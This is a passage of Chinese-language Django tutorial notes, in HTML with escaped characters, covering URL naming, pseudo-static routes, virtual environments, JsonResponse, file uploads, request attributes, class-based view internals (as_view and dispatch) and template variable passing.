&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B; &#x6709;&#x591A;&#x4E2A;app&#x7684;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x5728;&#x8D77;&#x522B;&#x540D;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x52A0;&#x4E0A;app&#x7684;&#x524D;&#x7F00;
&#x8FD9;&#x6837;&#x7684;&#x8BDD;&#x5C31;&#x80FD;&#x591F;&#x786E;&#x4FDD;&#x591A;&#x4E2A;app&#x4E4B;&#x95F4;&#x540D;&#x5B57;&#x4E0D;&#x51B2;&#x7A81;&#x7684;&#x95EE;&#x9898;
&quot;&quot;&quot;</span>
urlpatterns = [
    url(<span class="hljs-string">r&apos;^reg/&apos;</span>,views.reg,name=<span class="hljs-string">&apos;app01_reg&apos;</span>)
]
urlpatterns = [
    url(<span class="hljs-string">r&apos;^reg/&apos;</span>,views.reg,name=<span class="hljs-string">&apos;app02_reg&apos;</span>)
]
</code></pre>
<h4 id="&#x4F2A;&#x9759;&#x6001;">&#x4F2A;&#x9759;&#x6001;</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x9759;&#x6001;&#x7F51;&#x9875;
    &#x6570;&#x636E;&#x662F;&#x5199;&#x6B7B;&#x7684; &#x4E07;&#x5E74;&#x4E0D;&#x53D8;

&#x4F2A;&#x9759;&#x6001;
    &#x5C06;&#x4E00;&#x4E2A;&#x52A8;&#x6001;&#x7F51;&#x9875;&#x4F2A;&#x88C5;&#x6210;&#x9759;&#x6001;&#x7F51;&#x9875;

    &#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x4F2A;&#x88C5;&#x5462;&#xFF1F;
        https://www.cnblogs.com/Dominic-Ji/p/9234099.html
        &#x4F2A;&#x88C5;&#x7684;&#x76EE;&#x7684;&#x5728;&#x4E8E;&#x589E;&#x5927;&#x672C;&#x7F51;&#x7AD9;&#x7684;seo&#x67E5;&#x8BE2;&#x529B;&#x5EA6;
        &#x5E76;&#x4E14;&#x589E;&#x52A0;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x6536;&#x85CF;&#x672C;&#x7F51;&#x4E0A;&#x7684;&#x6982;&#x7387;

    &#x641C;&#x7D22;&#x5F15;&#x64CE;&#x672C;&#x8D28;&#x4E0A;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5DE8;&#x5927;&#x7684;&#x722C;&#x866B;&#x7A0B;&#x5E8F;

    &#x603B;&#x7ED3;:
        &#x65E0;&#x8BBA;&#x4F60;&#x600E;&#x4E48;&#x4F18;&#x5316; &#x600E;&#x4E48;&#x5904;&#x7406;
        &#x59CB;&#x7EC8;&#x8FD8;&#x662F;&#x5E72;&#x4E0D;&#x8FC7;RMB&#x73A9;&#x5BB6;
&quot;&quot;&quot;</span>
urlpatterns = [
    url(<span class="hljs-string">r&apos;^reg.html&apos;</span>,views.reg,name=<span class="hljs-string">&apos;app02_reg&apos;</span>)
]
</code></pre>
<h4 id="&#x865A;&#x62DF;&#x73AF;&#x5883;">&#x865A;&#x62DF;&#x73AF;&#x5883;</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x5728;&#x6B63;&#x5E38;&#x5F00;&#x53D1;&#x4E2D; &#x6211;&#x4EEC;&#x4F1A;&#x7ED9;&#x6BCF;&#x4E00;&#x4E2A;&#x9879;&#x76EE;&#x914D;&#x5907;&#x4E00;&#x4E2A;&#x8BE5;&#x9879;&#x76EE;&#x72EC;&#x6709;&#x7684;&#x89E3;&#x91CA;&#x5668;&#x73AF;&#x5883;
&#x8BE5;&#x73AF;&#x5883;&#x5185;&#x53EA;&#x6709;&#x8BE5;&#x9879;&#x76EE;&#x7528;&#x5230;&#x7684;&#x6A21;&#x5757; &#x7528;&#x4E0D;&#x5230;&#x4E00;&#x6982;&#x4E0D;&#x88C5;

linux:&#x7F3A;&#x4EC0;&#x4E48;&#x624D;&#x88C5;&#x4EC0;&#x4E48;

&#x865A;&#x62DF;&#x73AF;&#x5883;
    &#x4F60;&#x6BCF;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x865A;&#x62DF;&#x73AF;&#x5883;&#x5C31;&#x7C7B;&#x4F3C;&#x4E8E;&#x91CD;&#x65B0;&#x4E0B;&#x8F7D;&#x4E86;&#x4E00;&#x4E2A;&#x7EAF;&#x51C0;&#x7684;python&#x89E3;&#x91CA;&#x5668;
    &#x4F46;&#x662F;&#x865A;&#x62DF;&#x73AF;&#x5883;&#x4E0D;&#x8981;&#x521B;&#x5EFA;&#x592A;&#x591A;&#xFF0C;&#x662F;&#x9700;&#x8981;&#x6D88;&#x8017;&#x786C;&#x76D8;&#x7A7A;&#x95F4;&#x7684;

&#x6269;&#x5C55;:
    &#x6BCF;&#x4E00;&#x4E2A;&#x9879;&#x76EE;&#x90FD;&#x9700;&#x8981;&#x7528;&#x5230;&#x5F88;&#x591A;&#x6A21;&#x5757; &#x5E76;&#x4E14;&#x6BCF;&#x4E2A;&#x6A21;&#x5757;&#x7248;&#x672C;&#x53EF;&#x80FD;&#x8FD8;&#x4E0D;&#x4E00;&#x6837;
    &#x90A3;&#x6211;&#x8BE5;&#x5982;&#x4F55;&#x5B89;&#x88C5;&#x5462;&#xFF1F; &#x4E00;&#x4E2A;&#x4E2A;&#x770B;&#x4E00;&#x4E2A;&#x4E2A;&#x88C5;&#xFF1F;&#xFF1F;&#xFF1F;

    &#x5F00;&#x53D1;&#x5F53;&#x4E2D;&#x6211;&#x4EEC;&#x4F1A;&#x7ED9;&#x6BCF;&#x4E00;&#x4E2A;&#x9879;&#x76EE;&#x914D;&#x5907;&#x4E00;&#x4E2A;requirements.txt&#x6587;&#x4EF6;
    &#x91CC;&#x9762;&#x4E66;&#x5199;&#x4E86;&#x8BE5;&#x9879;&#x76EE;&#x6240;&#x6709;&#x7684;&#x6A21;&#x5757;&#x5373;&#x7248;&#x672C;
    &#x4F60;&#x53EA;&#x9700;&#x8981;&#x76F4;&#x63A5;&#x8F93;&#x5165;&#x4E00;&#x6761;&#x547D;&#x4EE4;&#x5373;&#x53EF;&#x4E00;&#x952E;&#x5B89;&#x88C5;&#x6240;&#x6709;&#x6A21;&#x5757;&#x5373;&#x7248;&#x672C;
&quot;&quot;&quot;</span>
</code></pre>
<p><a href="https://imgse.com/i/p91WGA1" target="_blank"><img src="https://s1.ax1x.com/2023/04/29/p91WGA1.png" alt="p91WGA1.png"></a></p>
<h4 id="&#x89C6;&#x56FE;&#x5C42;">&#x89C6;&#x56FE;&#x5C42;</h4>
<p>&#x4E09;&#x677F;&#x65A7;</p>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
HttpResponse
    &#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;
render
    &#x8FD4;&#x56DE;html&#x9875;&#x9762; &#x5E76;&#x4E14;&#x5728;&#x8FD4;&#x56DE;&#x7ED9;&#x6D4F;&#x89C8;&#x5668;&#x4E4B;&#x524D;&#x8FD8;&#x53EF;&#x4EE5;&#x7ED9;html&#x6587;&#x4EF6;&#x4F20;&#x503C;
redirect
    &#x91CD;&#x5B9A;&#x5411;
&quot;&quot;&quot;</span>
</code></pre>
<h4 id="jsonresponse&#x5BF9;&#x8C61;">JsonResponse&#x5BF9;&#x8C61;</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
json&#x683C;&#x5F0F;&#x7684;&#x6570;&#x636E;&#x6709;&#x4EC0;&#x4E48;&#x7528;&#xFF1F;
    &#x524D;&#x540E;&#x7AEF;&#x6570;&#x636E;&#x4EA4;&#x4E92;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x5230;json&#x4F5C;&#x4E3A;&#x8FC7;&#x6E21; &#x5B9E;&#x73B0;&#x8DE8;&#x8BED;&#x8A00;&#x4F20;&#x8F93;&#x6570;&#x636E;

&#x524D;&#x7AEF;&#x5E8F;&#x5217;&#x5316;
    JSON.stringify()                    json.dumps()
    JSON.parse()                            json.loads()
&quot;&quot;&quot;</span>
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">from</span> django.http <span class="hljs-keyword">import</span> JsonResponse
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ab_json</span><span class="hljs-params">(request)</span>:</span>
    user_dict = {<span class="hljs-string">&apos;username&apos;</span>:<span class="hljs-string">&apos;jason&#x597D;&#x5E05;&#x54E6;,&#x6211;&#x597D;&#x559C;&#x6B22;!&apos;</span>,<span class="hljs-string">&apos;password&apos;</span>:<span class="hljs-string">&apos;123&apos;</span>,<span class="hljs-string">&apos;hobby&apos;</span>:<span class="hljs-string">&apos;girl&apos;</span>}

    l = [<span class="hljs-number">111</span>,<span class="hljs-number">222</span>,<span class="hljs-number">333</span>,<span class="hljs-number">444</span>,<span class="hljs-number">555</span>]
    <span class="hljs-comment"># &#x5148;&#x8F6C;&#x6210;json&#x683C;&#x5F0F;&#x5B57;&#x7B26;&#x4E32;</span>
    <span class="hljs-comment"># json_str = json.dumps(user_dict,ensure_ascii=False)</span>
    <span class="hljs-comment"># &#x5C06;&#x8BE5;&#x5B57;&#x7B26;&#x4E32;&#x8FD4;&#x56DE;</span>
    <span class="hljs-comment"># return HttpResponse(json_str)</span>
    <span class="hljs-comment"># &#x8BFB;&#x6E90;&#x7801;&#x638C;&#x63E1;&#x7528;&#x6CD5;</span>
    <span class="hljs-comment"># return JsonResponse(user_dict,json_dumps_params={&apos;ensure_ascii&apos;:False})</span>
    <span class="hljs-comment"># In order to allow non-dict objects to be serialized set the safe parameter to False.</span>
    <span class="hljs-comment"># return JsonResponse(l,safe=False)  </span>
    <span class="hljs-comment"># &#x9ED8;&#x8BA4;&#x53EA;&#x80FD;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x5178; &#x5E8F;&#x5217;&#x5316;&#x5176;&#x4ED6;&#x9700;&#x8981;&#x52A0;safe&#x53C2;&#x6570;</span>
</code></pre>
<h4 id="form&#x8868;&#x5355;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x53CA;&#x540E;&#x7AEF;&#x5982;&#x4F55;&#x64CD;&#x4F5C;">form&#x8868;&#x5355;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x53CA;&#x540E;&#x7AEF;&#x5982;&#x4F55;&#x64CD;&#x4F5C;</h4>
<p>&#x5728;settings&#x91CC;&#x9762;</p>
<pre><code>MEDIA_ROOT = os.path.join(BASE_DIR, &apos;static&apos;, &apos;img&apos;)
MEDIA_URL = &apos;/media/&apos;
</code></pre><p>urls.py</p>
<pre><code class="lang-python">urlpatterns = [
    re_path(<span class="hljs-string">r&apos;^ab_file/&apos;</span>,views.ab_file),
] + static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
</code></pre>
<p>form.html</p>
<pre><code class="lang-html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://cdn.bootcss.com/twitter-bootstrap/3.4.1/css/bootstrap.min.css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js&quot;</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.bootcss.com/twitter-bootstrap/3.4.1/js/bootstrap.min.js&quot;</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>username:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>file:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>views.py</p>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
form&#x8868;&#x5355;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x7684;&#x6570;&#x636E;
    1.method&#x5FC5;&#x987B;&#x6307;&#x5B9A;&#x6210;post
    2.enctype&#x5FC5;&#x987B;&#x6362;&#x6210;formdata

&quot;&quot;&quot;</span>
<span class="hljs-keyword">import</span> os
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ab_file</span><span class="hljs-params">(request)</span>:</span>
    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&apos;POST&apos;</span>:
        file_obj = request.FILES.get(<span class="hljs-string">&apos;file&apos;</span>)
        file_path = os.path.join(settings.MEDIA_ROOT, file_obj.name)
        <span class="hljs-keyword">with</span> open(file_path,<span class="hljs-string">&apos;wb&apos;</span>) <span class="hljs-keyword">as</span> f:
            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file_obj.chunks():
                f.write(line)
        <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&apos;Upload Success!&apos;</span>)

    <span class="hljs-keyword">return</span> render(request,<span class="hljs-string">&apos;form.html&apos;</span>)
</code></pre>
<h4 id="request&#x5BF9;&#x8C61;&#x65B9;&#x6CD5;">request&#x5BF9;&#x8C61;&#x65B9;&#x6CD5;</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
request.method
request.POST
request.GET
request.FILES
request.body  # &#x539F;&#x751F;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x53D1;&#x8FC7;&#x6765;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;  &#x540E;&#x9762;&#x8BE6;&#x7EC6;&#x7684;&#x8BB2;
request.path 
request.path_info
request.get_full_path()  &#x80FD;&#x8FC7;&#x83B7;&#x53D6;&#x5B8C;&#x6574;&#x7684;url&#x53CA;&#x95EE;&#x53F7;&#x540E;&#x9762;&#x7684;&#x53C2;&#x6570; 
&quot;&quot;&quot;</span>
    print(request.path)  <span class="hljs-comment"># /app01/ab_file/</span>
    print(request.path_info)  <span class="hljs-comment"># /app01/ab_file/</span>
    print(request.get_full_path())  <span class="hljs-comment"># /app01/ab_file/?username=jason</span>
</code></pre>
<h4 id="fbv&#x4E0E;cbv">FBV&#x4E0E;CBV</h4>
<pre><code class="lang-python"><span class="hljs-comment"># &#x89C6;&#x56FE;&#x51FD;&#x6570;&#x65E2;&#x53EF;&#x4EE5;&#x662F;&#x51FD;&#x6570;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x7C7B;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">(request)</span>:</span>
  <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&apos;index&apos;</span>)

<span class="hljs-comment"># CBV</span>
    <span class="hljs-comment"># CBV&#x8DEF;&#x7531;</span>
    url(<span class="hljs-string">r&apos;^login/&apos;</span>,views.MyLogin.as_view())
        <span class="hljs-keyword">from</span> django.views <span class="hljs-keyword">import</span> View
        <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyLogin</span><span class="hljs-params">(View)</span>:</span>
        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span><span class="hljs-params">(self,request)</span>:</span>
        <span class="hljs-keyword">return</span> render(request,<span class="hljs-string">&apos;form.html&apos;</span>)

        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post</span><span class="hljs-params">(self,request)</span>:</span>
        <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&apos;post&#x65B9;&#x6CD5;&apos;</span>)

<span class="hljs-string">&quot;&quot;&quot;
FBV&#x548C;CBV&#x5404;&#x6709;&#x5343;&#x79CB;
CBV&#x7279;&#x70B9;
    &#x80FD;&#x591F;&#x76F4;&#x63A5;&#x6839;&#x636E;&#x8BF7;&#x6C42;&#x65B9;&#x5F0F;&#x7684;&#x4E0D;&#x540C;&#x76F4;&#x63A5;&#x5339;&#x914D;&#x5230;&#x5BF9;&#x5E94;&#x7684;&#x65B9;&#x6CD5;&#x6267;&#x884C;

    &#x5185;&#x90E8;&#x5230;&#x5E95;&#x662F;&#x600E;&#x4E48;&#x5B9E;&#x73B0;&#x7684;&#xFF1F;
        CBV&#x5185;&#x90E8;&#x6E90;&#x7801;(******)
&quot;&quot;&quot;</span>
</code></pre>
<p>self</p>
<pre><code>1.&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x7684;&#x7C7B;&#x4EA7;&#x751F;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x5148;&#x4ECE;&#x5BF9;&#x8C61;&#x672C;&#x8EAB;&#x53BB;&#x627E;
2.&#x518D;&#x53BB;&#x4EA7;&#x751F;&#x8FD9;&#x4E2A;&#x5BF9;&#x8C61;&#x7684;&#x7C7B;&#x53BB;&#x627E;
3.&#x53BB;&#x5F53;&#x524D;&#x7C7B;&#x7684;&#x7236;&#x7C7B;&#x53BB;&#x627E;
</code></pre><h4 id="cbv&#x6E90;&#x7801;">CBV&#x6E90;&#x7801;</h4>
<pre><code class="lang-python"><span class="hljs-comment"># &#x4F60;&#x81EA;&#x5DF1;&#x4E0D;&#x8981;&#x4FEE;&#x6539;&#x6E90;&#x7801; &#x9664;&#x4E86;bug&#x5F88;&#x96BE;&#x627E;</span>

<span class="hljs-comment"># &#x7A81;&#x7834;&#x53E3;&#x5728;urls.py</span>
url(<span class="hljs-string">r&apos;^login/&apos;</span>,views.MyLogin.as_view())
<span class="hljs-comment"># url(r&apos;^login/&apos;,views.view)  FBV&#x4E00;&#x6A21;&#x4E00;&#x6837;</span>
<span class="hljs-comment"># CBV&#x4E0E;FBV&#x5728;&#x8DEF;&#x7531;&#x5339;&#x914D;&#x4E0A;&#x672C;&#x8D28;&#x662F;&#x4E00;&#x6837;&#x7684; &#x90FD;&#x662F;&#x8DEF;&#x7531; &#x5BF9;&#x5E94; &#x51FD;&#x6570;&#x5185;&#x5B58;&#x5730;&#x5740;</span>
<span class="hljs-string">&quot;&quot;&quot;
&#x51FD;&#x6570;&#x540D;/&#x65B9;&#x6CD5;&#x540D; &#x52A0;&#x62EC;&#x53F7;&#x6267;&#x884C;&#x4F18;&#x5148;&#x7EA7;&#x6700;&#x9AD8;
&#x731C;&#x6D4B;
    as_view()
        &#x8981;&#x4E48;&#x662F;&#x88AB;@staicmethod&#x4FEE;&#x9970;&#x7684;&#x9759;&#x6001;&#x65B9;&#x6CD5;
        &#x8981;&#x4E48;&#x662F;&#x88AB;@classmethod&#x4FEE;&#x9970;&#x7684;&#x7C7B;&#x65B9;&#x6CD5;  &#x6B63;&#x786E;

    @classonlymethod
    def as_view(cls, **initkwargs):
        pass
&quot;&quot;&quot;</span>

<span class="hljs-meta">    @classonlymethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">as_view</span><span class="hljs-params">(cls, **initkwargs)</span>:</span>
        <span class="hljs-string">&quot;&quot;&quot;
        cls&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x7C7B;   MyCBV
        Main entry point for a request-response process.
        &quot;&quot;&quot;</span>
        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">view</span><span class="hljs-params">(request, *args, **kwargs)</span>:</span>
            self = cls(**initkwargs)  <span class="hljs-comment"># cls&#x662F;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x7C7B;</span>
            <span class="hljs-comment"># self = MyLogin(**initkwargs)  &#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x7C7B;&#x7684;&#x5BF9;&#x8C61;</span>
            <span class="hljs-keyword">return</span> self.dispatch(request, *args, **kwargs)
            <span class="hljs-string">&quot;&quot;&quot;
            &#x4EE5;&#x540E;&#x4F60;&#x4EEC;&#x4F1A;&#x7ECF;&#x5E38;&#x9700;&#x8981;&#x770B;&#x6E90;&#x7801; &#x4F46;&#x662F;&#x5728;&#x770B;python&#x6E90;&#x7801;&#x7684;&#x65F6;&#x5019; &#x4E00;&#x5B9A;&#x8981;&#x65F6;&#x523B;&#x63D0;&#x9192;&#x81EA;&#x5DF1;&#x9762;&#x5411;&#x5BF9;&#x8C61;&#x5C5E;&#x6027;&#x65B9;&#x6CD5;&#x67E5;&#x627E;&#x987A;&#x5E8F;
                &#x5148;&#x4ECE;&#x5BF9;&#x8C61;&#x81EA;&#x5DF1;&#x627E;
                &#x518D;&#x53BB;&#x4EA7;&#x751F;&#x5BF9;&#x8C61;&#x7684;&#x7C7B;&#x91CC;&#x9762;&#x627E;
                &#x4E4B;&#x540E;&#x518D;&#x53BB;&#x7236;&#x7C7B;&#x627E;
                ...
            &#x603B;&#x7ED3;:&#x770B;&#x6E90;&#x7801;&#x53EA;&#x8981;&#x770B;&#x5230;&#x4E86;self&#x70B9;&#x4E00;&#x4E2A;&#x4E1C;&#x897F; &#x4E00;&#x5B9A;&#x8981;&#x95EE;&#x4F60;&#x81EA;&#x5DF1;&#x5F53;&#x524D;&#x8FD9;&#x4E2A;self&#x5230;&#x5E95;&#x662F;&#x8C01;
            &quot;&quot;&quot;</span>
        <span class="hljs-keyword">return</span> view

        <span class="hljs-comment"># CBV&#x7684;&#x7CBE;&#x9AD3;</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dispatch</span><span class="hljs-params">(self, request, *args, **kwargs)</span>:</span>
        <span class="hljs-comment"># &#x83B7;&#x53D6;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x7684;&#x5C0F;&#x5199;&#x683C;&#x5F0F; &#x7136;&#x540E;&#x6BD4;&#x5BF9;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x65B9;&#x5F0F;&#x662F;&#x5426;&#x5408;&#x6CD5;</span>
        <span class="hljs-comment"># get&#x8BF7;&#x6C42;&#x4E3A;&#x4F8B;</span>
        <span class="hljs-comment"># post&#x8BF7;&#x6C42;</span>
        <span class="hljs-keyword">if</span> request.method.lower() <span class="hljs-keyword">in</span> self.http_method_names:
            handler = getattr(self, request.method.lower(), self.http_method_not_allowed)
            <span class="hljs-string">&quot;&quot;&quot;
            &#x53CD;&#x5C04;:&#x901A;&#x8FC7;&#x5B57;&#x7B26;&#x4E32;&#x6765;&#x64CD;&#x4F5C;&#x5BF9;&#x8C61;&#x7684;&#x5C5E;&#x6027;&#x6216;&#x8005;&#x65B9;&#x6CD5;
                handler = getattr(&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x7C7B;&#x4EA7;&#x751F;&#x7684;&#x5BF9;&#x8C61;,&apos;get&apos;,&#x5F53;&#x627E;&#x4E0D;&#x5230;get&#x5C5E;&#x6027;&#x6216;&#x8005;&#x65B9;&#x6CD5;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x4F1A;&#x7528;&#x7B2C;&#x4E09;&#x4E2A;&#x53C2;&#x6570;)
                handler = &#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x7C7B;&#x91CC;&#x9762;&#x7684;get&#x65B9;&#x6CD5;
            &quot;&quot;&quot;</span>
        <span class="hljs-keyword">else</span>:
            handler = self.http_method_not_allowed
        <span class="hljs-keyword">return</span> handler(request, *args, **kwargs)
        <span class="hljs-string">&quot;&quot;&quot;
        &#x81EA;&#x52A8;&#x8C03;&#x7528;get&#x65B9;&#x6CD5;
        &quot;&quot;&quot;</span>

<span class="hljs-comment"># &#x8981;&#x6C42;&#x638C;&#x63E1;&#x5230;&#x4E0D;&#x770B;&#x6E90;&#x7801;&#x4E5F;&#x80FD;&#x591F;&#x63CF;&#x8FF0;&#x51FA;CBV&#x7684;&#x5185;&#x90E8;&#x6267;&#x884C;&#x6D41;&#x7A0B;(******)</span>
</code></pre>
<h4 id="&#x6A21;&#x7248;&#x8BED;&#x6CD5;&#x4F20;&#x503C;">&#x6A21;&#x7248;&#x8BED;&#x6CD5;&#x4F20;&#x503C;</h4>
<p>{[]}:&#x53D8;&#x91CF;&#x76F8;&#x5173;</p>
<p>{##}:&#x903B;&#x8F91;&#x76F8;&#x5173;</p>
<pre><code class="lang-python">def index(request):
    # &#x6A21;&#x7248;&#x8BED;&#x6CD5;&#x53EF;&#x4EE5;&#x4F20;&#x9012;&#x7684;&#x540E;&#x7AEF;python&#x6570;&#x636E;&#x7C7B;&#x578B;
    n = 123
    f = 11.11
    s = &apos;&#x6211;&#x4E5F;&#x60F3;&#x5954;&#x73B0;&apos;
    b = True
    l = [&apos;&#x5C0F;&#x7EA2;&apos;,&apos;&#x59D7;&#x59D7;&apos;,&apos;&#x82B1;&#x82B1;&apos;,&apos;&#x8339;&#x8339;&apos;]
    t = (111,222,333,444)
    d = {&apos;username&apos;:&apos;jason&apos;,&apos;age&apos;:18,&apos;info&apos;:&apos;&#x8FD9;&#x4E2A;&#x4EBA;&#x6709;&#x70B9;&#x610F;&#x601D;&apos;}
    se = {&apos;&#x6676;&#x6676;&apos;,&apos;&#x6D0B;&#x6D0B;&apos;,&apos;&#x5624;&#x5624;&apos;}

    def func():
        print(&apos;&#x6211;&#x88AB;&#x6267;&#x884C;&#x4E86;&apos;)
        return &apos;&#x4F60;&#x7684;&#x53E6;&#x4E00;&#x534A;&#x5728;&#x7B49;&#x4F60;&apos;

    class MyClass(object):
        def get_self(self):
            return &apos;self&apos;

        @staticmethod
        def get_func():
            return &apos;func&apos;

        @classmethod
        def get_class(cls):
            return &apos;cls&apos;

        # &#x5BF9;&#x8C61;&#x88AB;&#x5C55;&#x793A;&#x5230;html&#x9875;&#x9762;&#x4E0A; &#x5C31;&#x7C7B;&#x4F3C;&#x4E8E;&#x6267;&#x884C;&#x4E86;&#x6253;&#x5370;&#x64CD;&#x4F5C;&#x4E5F;&#x4F1A;&#x89E6;&#x53D1;__str__&#x65B9;&#x6CD5;
        def __str__(self):
            return &apos;&#x5230;&#x5E95;&#x4F1A;&#x4E0D;&#x4F1A;&#xFF1F;&apos;  

    obj = MyClass()

    # return render(request,&apos;index.html&apos;,{})  # &#x4E00;&#x4E2A;&#x4E2A;&#x4F20;
    return render(request,&apos;index.html&apos;,locals())


&lt;p&gt;{[ n ]}&lt;/p&gt;
&lt;p&gt;{[ f ]}&lt;/p&gt;
&lt;p&gt;{[ s ]}&lt;/p&gt;
&lt;p&gt;{[ b ]}&lt;/p&gt;
&lt;p&gt;{[ l ]}&lt;/p&gt;
&lt;p&gt;{[ d ]}&lt;/p&gt;
&lt;p&gt;{[ t ]}&lt;/p&gt;
&lt;p&gt;{[ se ]}&lt;/p&gt;
&lt;p&gt;&#x4F20;&#x9012;&#x51FD;&#x6570;&#x540D;&#x4F1A;&#x81EA;&#x52A8;&#x52A0;&#x62EC;&#x53F7;&#x8C03;&#x7528; &#x4F46;&#x662F;&#x6A21;&#x7248;&#x8BED;&#x6CD5;&#x4E0D;&#x652F;&#x6301;&#x7ED9;&#x51FD;&#x6570;&#x4F20;&#x989D;&#x5916;&#x7684;&#x53C2;&#x6570;:{[ func ]}&lt;/p&gt;
